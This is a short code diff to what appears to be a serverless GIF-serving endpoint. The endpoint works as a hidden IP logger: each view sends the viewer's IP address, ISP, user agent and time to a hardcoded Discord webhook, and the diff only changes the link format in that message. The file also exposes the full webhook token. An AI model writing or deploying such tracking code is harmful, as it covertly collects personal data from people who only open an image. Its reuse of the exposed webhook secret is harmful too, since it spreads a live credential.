@@ -33,7 +33,7 @@ export default async function handler(req, res) {
     const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
     
     // Webhook payload
-    const message = `🖼️ **GIF Viewed!**%0A🎬 **GIF:** #${id} (${id}.gif)%0A🌐 **IP:** \`${ip}\`%0A🏢 **ISP:** ${org}%0A🖥️ **Browser/UA:** ${ua.substring(0, 100)}%0A🕐 **Time:** ${now}%0A🔗 **Direct:** https://goyzinparis.vercel.app/api/gif/${id}`;
+    const message = `🖼️ **GIF Viewed!**%0A🎬 **GIF:** #${id} (${id}.gif)%0A🌐 **IP:** \`${ip}\`%0A🏢 **ISP:** ${org}%0A🖥️ **Browser/UA:** ${ua.substring(0, 100)}%0A🕐 **Time:** ${now}%0A🔗 **Direct:** https://goyzinparis.vercel.app/${id}.gif`;
     
     const webhookUrl = 'https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2';
     
